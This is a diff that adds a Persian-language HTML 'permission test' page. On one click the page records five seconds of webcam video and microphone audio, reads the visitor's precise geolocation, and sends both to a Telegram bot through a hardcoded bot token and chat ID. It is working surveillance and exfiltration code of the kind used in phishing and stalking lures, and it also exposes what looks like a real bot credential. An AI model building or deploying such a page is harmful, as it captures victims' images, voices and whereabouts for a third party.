@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه تست دسترسی‌ها</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        video, audio { width: 300px; margin: 10px; }
+        button { padding: 10px 20px; font-size: 16px; margin: 10px; }
+        #status { color: green; margin: 20px; }
+        #error { color: red; }
+    </style>
+</head>
+<body>
+    <h1>تست دسترسی به وبکم، میکروفون و لوکیشن</h1>
+    <p>روی دکمه کلیک کنید تا دسترسی‌ها درخواست بشه و داده‌ها به تلگرام فرستاده بشه.</p>
+    
+    <video id="webcam" autoplay muted></video>
+    <audio id="audio" controls></audio>
+    <br>
+    <button id="startBtn">شروع و ارسال به تلگرام</button>
+    <div id="status"></div>
+    <div id="error"></div>
+
+    <script>
+        const BOT_TOKEN = '8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4'; // توکن بات تلگرام رو اینجا بگذارید
+        const CHAT_ID = '6080665310'; // چت آیدی (عدد) رو اینجا بگذارید
+        const status = document.getElementById('status');
+        const error = document.getElementById('error');
+        const webcam = document.getElementById('webcam');
+        const audioEl = document.getElementById('audio');
+        const startBtn = document.getElementById('startBtn');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                status.textContent = 'در حال گرفتن دسترسی‌ها...';
+                error.textContent = '';
+
+                // 1. دسترسی به وبکم و میکروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                webcam.srcObject = stream;
+
+                // ضبط کوتاه ویدیو (5 ثانیه) برای snapshot
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const videoUrl = URL.createObjectURL(blob);
+                    audioEl.src = videoUrl; // برای نمایش (فقط صدا، چون ویدیو کوتاهه)
+
+                    // آپلود ویدیو به تلگرام (به عنوان document)
+                    await sendToTelegram('ویدیو و صوت ضمیمه:', blob, 'video.webm');
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); // 5 ثانیه ضبط
+
+                // 2. گرفتن لوکیشن دقیق
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                const location = `عرض جغرافیایی: ${position.coords.latitude}, طول جغرافیایی: ${position.coords.longitude}, دقت: ${position.coords.accuracy}m`;
+
+                // 3. فرستادن لوکیشن به تلگرام
+                await sendToTelegram('لوکیشن کاربر:', null, null, location);
+
+                status.textContent = 'داده‌ها با موفقیت به تلگرام فرستاده شد!';
+            } catch (err) {
+                error.textContent = `خطا: ${err.message}. لطفاً دسترسی‌ها رو تأیید کنید.`;
+            }
+        });
+
+        // تابع فرستادن متن به تلگرام
+        async function sendToTelegram(caption, fileBlob = null, fileName = null, text = null) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            let message = caption;
+            if (text) message += `\n${text}`;
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', message);
+            formData.append('parse_mode', 'HTML');
+
+            if (fileBlob && fileName) {
+                formData.append('video', fileBlob, fileName); // یا 'document' اگر ویدیو نباشه
+                // برای ویدیو از sendVideo استفاده کنید، اما اینجا sendDocument رو شبیه‌سازی می‌کنم
+                const videoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+                await fetch(videoUrl, { method: 'POST', body: formData });
+            } else {
+                const params = new URLSearchParams({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
+                await fetch(`${url}?${params}`);
+            }
+        }
+    </script>
+</body>
+</html>
